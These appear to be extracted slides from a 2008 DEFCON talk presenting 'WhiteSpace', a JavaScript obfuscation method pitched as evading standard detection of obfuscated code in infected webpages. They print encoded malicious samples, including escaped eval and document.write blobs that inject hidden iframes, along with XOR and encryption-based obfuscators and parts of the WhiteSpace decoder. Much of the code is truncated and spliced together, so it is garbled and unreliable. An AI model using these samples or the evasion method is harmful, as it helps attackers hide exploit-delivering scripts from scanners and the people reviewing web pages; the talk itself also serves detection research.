WhiteSpace:
A Different Approach to 
JavaScript Obfuscation
DEFCON 16
August, 2008
Kolisar
1
Introduction
• What led to WhiteSpace?
2
Agenda
• What is “WhiteSpace”?
• A Brief Survey of Current JavaScript 
Obfuscation Methods
• The Telltale Indicators of Obfuscation
• The Components of this Approach
• Demo
3
What is “WhiteSpace”?
• A different approach to JavaScript 
obfuscation
• Hides the usual, telltale indicators of 
obfuscation
• Not detectable by standard “Obfuscated 
JavaScript” detection methods (automatic 
and manual)
4
JavaScript Obfuscation 
Methods
• What is usually encoded
• Exploit code
• Hidden iFrames
5
JavaScript Obfuscation 
Methods (cont.)
• Escaped ASCII/Unicode Values
eval(unescape ('%77%69%6e%64%6f%77%2e
%73%74%61%74%75%73%3d%27%44%6f%6e%65%27%3b%64%6f
...
%35%35%20%68%65%69%67%68%74%3d
%35%31%31%20%73%74%79%6c%65%3d%5c%27%64%69%73%70%6c
%61%79%3a%20%6e%6f%6e%65%5c%27%3e%3c%2f
%69%66%72%61%6d%65%3e%27%29') );
document.write('\u003c\u0069\u0066\u0072\u0061\u006d
\u0065\u0020\u0073\u0072\u0063\u003d
\u0027\u0068\u0074\u0074\u0070
...
\u0065\u006e\u003b\u0027\u003e\u003c\u002f
\u0069\u0066\u0072\u0061\u006d\u0065\u003e')
6
JavaScript Obfuscation 
Methods (cont.)
• XOR (ASCII values)
function xor_str(plain_str, xor_key){ var xored_str = 
"";       for (var i = 0 ; i ”;
ok=”docume”;
uk=”eight=0>0;j--)
{r='';for(i=Math.min(l,b);i>0;i--,l--){w|
=(t[x.charCodeAt(p++)-48])>=8;s-
=2}else{s=6}}document.write(r)}}
decrypt_p(“S6dXf5aGSk8t49x1_t72lgGPdk72OvU6EUK6fWauC3
...
Ayu1N5xBEUK6qKDfsWz1V94J96CgBPa2u94J96CgDvnGC94J9I”);
10
JavaScript Obfuscation 
Methods (cont.)
• Non-encryption based Obfuscation
• Using Non-obvious Variable and Function 
Names
function v47d9df3cf15f9(v47d9df3cf1ddf){ function 
v47d9df3cf25b0 () {return 16;} 
...
{ function v47d9df3d01281 () {var v47d9df3d01a56=2; 
return v47d9df3d01a56;} var 
v47d9df3d002d9='';for(v47d9df3d00aac=0; 
v47d9df3d00aac 9)
            {
                v++;
            }
            if(x != 7)
            {
                v = v << 1;
            }
        }
        o += String.fromCharCode(v);
    }
}
23
WhiteSpace 
Decoding (cont.)
The Final Call
• h[i][j](o);  //this.document.write(o);
24
Limitations
• Decoding code must be included in 
infected webpage, this is JavaScript after all
(there may be ways around this)
25
Demonstration
26
Thanks
• 장인섭 (Insub Chang)
• Gar Morley
• JA
27
Questions?
28